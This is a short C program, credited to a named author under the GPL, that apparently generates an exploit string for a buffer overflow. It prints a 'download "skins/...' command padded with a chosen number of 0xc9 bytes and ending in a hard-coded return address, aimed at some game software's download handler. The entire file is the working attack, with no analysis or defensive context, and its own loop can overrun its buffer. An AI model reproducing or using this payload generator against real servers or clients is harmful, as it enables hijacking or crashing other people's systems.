/*
 * Written by Oscar Linderholm <slime@home.se>
 * license: GPL
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int
main (int argc, char **argv)
{
    char addr[4];
    char buff[256];
    int  i;

    if (argc != 2)
    {
	printf ("Usage: %s <number>\n", argv[0]);
	return 0;
    }

    memset (addr, '\0', sizeof (addr));
    memset (buff, '\0', sizeof (buff));

    for (i = 0; i < atoi (argv[1]); i++)
	buff[i] = 0xc9;

    addr[0] = 0x89;
    addr[1] = 0x83;
    addr[2] = 0x08;
    addr[3] = 0x08;

    printf ("download \"skins/%s", buff);
    printf ("%c%c%c%c\"\n", addr[0], addr[1], addr[2], addr[3]);

    return 0;
}
